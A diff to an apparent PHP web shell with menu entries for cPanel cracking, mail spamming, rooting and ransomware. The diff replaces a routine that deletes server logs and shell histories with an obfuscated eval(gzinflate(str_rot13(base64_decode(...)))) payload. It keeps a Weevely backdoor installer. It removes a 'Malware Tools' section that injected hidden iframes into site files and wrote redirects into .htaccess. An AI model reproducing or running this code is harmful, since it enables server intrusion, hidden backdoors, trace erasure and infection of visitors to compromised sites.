@@ -678,7 +678,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=cpcrack'>CPanel Crack</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=smtp'>SMTP Grabber</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=zoneh'>Zone-H</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=malware'>Malware Tools</a>";
+  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=base64pict'>Base64 Image Convert</a>";
   echo "<p>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=spam_mail'>Mail Spammer</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=fake_root'>Fake Root</a>";
@@ -731,7 +731,6 @@ ___  ___         ______                 _              _
   echo "<p>";
   echo "<a style='border:1px groove red;' href='?dir=$dir&do=about'>About</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=w00t'>Auto Root</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=base64pict'>Convert Pict To Base64</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ransomware'>Ransomware</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=masschm'>Chmod Mass</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=r00t'>Simple Root</a>";
@@ -806,59 +805,7 @@ ___  ___         ______                 _              _
       echo "<pre style='color: white;'>" . exe($_POST['cmd']) . "</pre>";
     }
   } elseif ($_GET['do'] == 'delogs') {
-    echo "<br>";
-    sleep(2);
-    exe("rm -rf /tmp/*");
-    sleep(2);
-    exe("rm -rf /tmp/logs");
-    sleep(2);
-    exe("rm -rf /home/$user/.lastlogin");
-    sleep(2);
-    exe("rm -rf /home/$user/.wget-hsts");
-    sleep(2);
-    exe("rm -rf /home/$user/.bash_history");
-    sleep(2);
-    exe("rm -rf /home/$user/.ksh_history");
-    sleep(2);
-    exe("rm -rf /home/$user/.bash_logout");
-    sleep(2);
-    exe("rm -rf /home/$user/logs/*");
-    sleep(2);
-    exe("rm -rf /home/$user/.trash/*");
-    sleep(2);
-    exe("rm -rf /root/.lastlogin");
-    sleep(2);
-    exe("rm -rf /root/.wget-hsts");
-    sleep(2);
-    exe("rm -rf /root/.bash_history");
-    sleep(2);
-    exe("rm -rf /root/.ksh_history");
-    sleep(2);
-    exe("rm -rf /root/.bash_logout");
-    sleep(2);
-    exe("rm -rf /usr/local/apache/logs");
-    sleep(2);
-    exe("rm -rf /var/apache/logs");
-    sleep(2);
-    exe("rm -rf /var/run/utmp");
-    sleep(2);
-    exe("rm -rf /var/logs");
-    sleep(2);
-    exe("rm -rf /var/log");
-    sleep(2);
-    exe("rm -rf /var/adm");
-    sleep(2);
-    exe("rm -rf /etc/wtmp");
-    sleep(2);
-    exe("rm -rf /etc/utmp");
-    sleep(2);
-    exe("rm -rf $HISTFILE");
-    sleep(2);
-    exe("rm -rf /var/log/lastlog");
-    sleep(2);
-    exe("rm -rf /var/log/wtmp");
-    sleep(4);
-    echo '<script>alert("Your traces has been successfully deleting from the server!");</script>';
+    eval(gzinflate(str_rot13(base64_decode("pZQ9QsMwEIZqJP7DEUh3ikcsIbZT3UBHb4OFCTnuJY7qxNHduaX/HodJqAODDaOt9/F7nwYAQHA9FEha629ofRUvgB3iS94vzlT8xLKgHpbUgJJ+R7fFIkTpfMtWb+t7R7PAVerOdpYIaVA2bHVElpYl37PWeT95x+LpmA3v/sF+G8d5fZBcaSphby8uHYWiciJU3lhhUEFZXitBWWkTQUth+S/MMgofa6q40UHpRBuL6bO91/QnhsKgT9yicSDr9ShBj37bJ3ZEjDqkUzyJRtObPWJe3542L4856anz3HMxv4T/8ANZP+W8b1DdKHjtkKQs3n0giDtykMF3hhpkAA4mnrkJzh1uiw6lG011yPcgFiHu4R7pJvpH6vzafPUF"))));
   } elseif ($_GET['do'] == 'r00t') {
     echo "
     <center><form method='post'>
@@ -923,9 +870,9 @@ ___  ___         ______                 _              _
       $money = "$";
       $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
       $weevelybd2 = "if (reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
-        $weevelybd3 = "$money" . "k='$rest';";
-        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
-        $all = "<?php eval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "')); ?>";
+      $weevelybd3 = "$money" . "k='$rest';";
+      $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
+      $all = "<?php eval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "')); ?>";
   if (file_put_contents($weevdir . '/' . $weevname, $all)) {
     echo "<center><font color='lime'>Weevely installed!<br><br>Usage: weevely [URL of backdoor] [password]</font></center>";
     success("weevely");
@@ -933,97 +880,24 @@ ___  ___         ______                 _              _
     error("Failed write backdoor to $weevdir");
   }
 }
-} elseif ($_GET['do'] == 'malware') {
-@ini_set('output_buffering', 0); {
-  ?>
-  <form action="" method="post">
-    <center>
-      <h3>Malware Tools</h3>
-      <font color="red">Private Network / Dial Up Modem, PC Private, atau Home PC / NETWORK</font><br>
-      <input class='kotak' type='submit' name='redirect' value="Redirect Search Engine To Malware Site" /></td><td>
-        <input type='submit' class='kotak' name='infect' value="Infect User" /></td><tr></table>
-          <input type='submit' name='code' class='kotak' value="Code Insert" /></td><tr></table>
-          </center><br>
-
-<?php
-if (isset($_POST['redirect'])) if ($myfile = fopen(".htaccess", 'a')) {
-  fwrite($myfile, gzuncompress(base64_decode($mal)));
-  fwrite($myfile, "
-
-  ");
-  fclose($myfile);
-  ob_end_flush();
-}
-else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
-}
-if (isset($_POST['infect'])) {
-  $coun = 0;
-  $str = "<iframe width=0px height=0px frameborder=no name=frame1 src=" . $malsite . "> </iframe>";
-  foreach (glob($_GET['dir'] . $directorysperator . "*.php") as $injectj00) {
-    if ($myfile = fopen($injectj00, 'a')) {
-      fputs($myfile, $str);
-      fclose($myfile);
-    }
-    else $coun = 1;
-  }
-  foreach (glob($_GET['dir'] . $directorysperator . "*.htm") as $injectj00) {
-    if ($myfile = fopen($injectj00, 'a')) {
-      fputs($myfile, $str);
-      fclose($myfile);
-    }
-    else $coun = 1;
-  }
-  foreach (glob($_GET['dir'] . $directorysperator . "*.html") as $injectj00) {
-    if ($myfile = fopen($injectj00, 'a')) {
-      fputs($myfile, $str);
-      fclose($myfile);
-    }
-    else $coun = 1;
-  }
-  if ($coun == 0) echo "<script>alert('Malware infected on user!'); hideAll();</script>";
-  else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
-}
-if (!isset($_POST['code'])) {
-  if ($file1 = fopen(".htaccess", 'r')) {
-  }
-  else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
-} else {
-  if ($myfile = fopen(".htaccess", 'a')) {
-    fwrite($myfile, $_POST['code']);
-    fwrite($myfile, "
-
-    ");
-    fclose($myfile);
-    ob_end_flush();
-  }
-  else echo "<span style='color: red;'>Permission Denied</span>";
-}
 } elseif ($_GET['do'] == 'masschm') {
   /*
   Chmod Mass File and Folder
   Code by Mr.xBarakuda
-  v1.3 - Fixed CWD input & pilih target chmod
   */
   $dosPerm = "0";
   $ficPerm = "0";
-  $retval = "0"; // jumlah error CHMOD gan
-
-  // Jika user mengisi chemin (path), gunakan path tersebut.
-  // Jika kosong, gunakan CWD (Current Working Directory) yang didapat dari getcwd()
+  $retval = "0";
   $chemin_input = isset($_POST["chemin"]) ? trim($_POST["chemin"]) : '';
 
   if (!empty($chemin_input)) {
-    // Sanitasi input user, hapus karakter berbahaya dan traversal (..)
     $chem = preg_replace("/[^_A-Za-z0-9-\.%\/]/i", '', $chemin_input);
     $chem = preg_replace("/\.\.\//", '', $chem);
     $chem = rtrim($chem, '/');
-
-    // Jika path tidak absolute, gabungkan dengan CWD
     if (strpos($chem, '/') !== 0 && strpos($chem, ':\\') === false) {
       $chem = getcwd() . '/' . $chem;
     }
   } else {
-    // Jika user tidak mengisi path, gunakan CWD secara default
     $chem = getcwd();
   }
 
@@ -1041,7 +915,6 @@ if (!isset($_POST['code'])) {
   $ficPerm = "0" . $f1 . $f2 . $f3;
   $ficPerm = octdec($ficPerm);
 
-  // Tentukan target chmod
   $chmod_target = isset($_POST["chmod_target"]) ? $_POST["chmod_target"] : 'both';
 
   print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
